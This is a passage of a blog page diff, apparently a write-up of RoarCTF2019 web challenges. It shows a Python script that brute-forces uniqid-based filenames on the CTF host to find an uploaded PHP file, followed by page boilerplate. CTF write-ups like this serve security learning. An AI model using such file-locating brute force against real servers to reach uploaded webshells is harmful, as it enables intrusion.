in rep.text:</span><br><span class="line">        print(url)</span><br><span class="line">        a+&#x3D;url</span><br><span class="line">        sys.exit()</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs awk">import requests
+a=<span class="hljs-string">''</span>
+<span class="hljs-comment"># for i in range(0x100,0xfff):</span>
+<span class="hljs-comment">#     url = "http://51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82/Public/Uploads/2019-10-15/5da5495e5d"+hex(i)[2:]+'.php'</span>
+<span class="hljs-comment">#     rep = requests.get(url)</span>
+<span class="hljs-comment">#     print(hex(i)[2:])</span>
+<span class="hljs-comment">#     if 'Version' in rep.text:</span>
+<span class="hljs-comment">#         print(url)</span>
+<span class="hljs-comment">#         a+=url</span>
+<span class="hljs-comment">#         sys.exit()</span>
+<span class="hljs-comment">#         break</span>
+        
+<span class="hljs-comment"># for i in range(0x1000,0xffff):</span>
+<span class="hljs-comment">#     url = "http://51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82/Public/Uploads/2019-10-15/5da5495e5"+hex(i)[2:]+'.php'</span>
+<span class="hljs-comment">#     rep = requests.get(url)</span>
+<span class="hljs-comment">#     print(hex(i)[2:])</span>
+<span class="hljs-comment">#     if 'Version' in rep.text:</span>
+<span class="hljs-comment">#         print(url)</span>
+<span class="hljs-comment">#         a+=url</span>
+<span class="hljs-comment">#         sys.exit()</span>
+<span class="hljs-comment">#         break</span>
+        
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>x6cd19,<span class="hljs-number">0</span>xfffff):
+    url = <span class="hljs-string">"http://51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82/Public/Uploads/2019-10-15/5da5583e"</span>+hex(i)[<span class="hljs-number">2</span>:]+<span class="hljs-string">'.php'</span>
+    rep = requests.get(url)
+    print(hex(i)[<span class="hljs-number">2</span>:])
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'Version'</span> <span class="hljs-keyword">in</span> rep.text:
+        print(url)
+        a+=url
+        sys.<span class="hljs-keyword">exit</span>()
+        <span class="hljs-keyword">break</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>xe6cd19,<span class="hljs-number">0</span>xffffff):
+    url = <span class="hljs-string">"http://51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82/Public/Uploads/2019-10-15/5da5583"</span>+hex(i)[<span class="hljs-number">2</span>:]+<span class="hljs-string">'.php'</span>
+    rep = requests.get(url)
+    print(hex(i)[<span class="hljs-number">2</span>:])
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'Version'</span> <span class="hljs-keyword">in</span> rep.text:
+        print(url)
+        a+=url
+        sys.<span class="hljs-keyword">exit</span>()
+        <span class="hljs-keyword">break</span>
+
+print(a)</code></pre>
 
 
 
@@ -282,161 +549,259 @@
 
 <h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><p><a href="https://mp.weixin.qq.com/s?srcid=1016GXIy2HOar4STCzN93JIO&amp;scene=23&amp;sharer_sharetime=1571181198903&amp;mid=2247483858&amp;sharer_shareid=fbbfc02e7625095a3404e2482b0c7a95&amp;sn=19234bf6611400ae9da5d9a49a233cde&amp;idx=1&amp;__biz=MzkwNzAwMDYyNQ%3D%3D&amp;chksm=c0deaf8cf7a9269a32d928617d0c3eb11720914c591e0dc4d017450b9ef3809f2ed6a348a1b8&amp;mpshare=1#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?srcid=1016GXIy2HOar4STCzN93JIO&amp;scene=23&amp;sharer_sharetime=1571181198903&amp;mid=2247483858&amp;sharer_shareid=fbbfc02e7625095a3404e2482b0c7a95&amp;sn=19234bf6611400ae9da5d9a49a233cde&amp;idx=1&amp;__biz=MzkwNzAwMDYyNQ%3D%3D&amp;chksm=c0deaf8cf7a9269a32d928617d0c3eb11720914c591e0dc4d017450b9ef3809f2ed6a348a1b8&amp;mpshare=1#rd</a></p>
 
-  </div>
-</article>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/10/17/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E4%B8%80/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTTP请求走私基础学习(一)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/10/11/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="hidden-mobile">历史漏洞分析之PHPCMS v9.6.0 SQL注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#simple-calc"><span class="toc-number">1.</span> <span class="toc-text">simple-calc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目源码"><span class="toc-number">1.1.</span> <span class="toc-text">题目源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解法一"><span class="toc-number">1.2.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解法二"><span class="toc-number">1.3.</span> <span class="toc-text">解法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#simple-Upload"><span class="toc-number">2.</span> <span class="toc-text">simple-Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#uniqid函数"><span class="toc-number">2.1.</span> <span class="toc-text">uniqid函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">2.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传exp"><span class="toc-number">2.3.</span> <span class="toc-text">文件上传exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后缀爆破"><span class="toc-number">2.4.</span> <span class="toc-text">后缀爆破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wp"><span class="toc-number">3.</span> <span class="toc-text">wp</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&text=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&is_video=false&description=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=RoarCTF2019_web题解(待补充)&body=Check out this article: http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&name=RoarCTF2019_web题解(待补充)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&t=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "RoarCTF2019_web题解(待补充)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
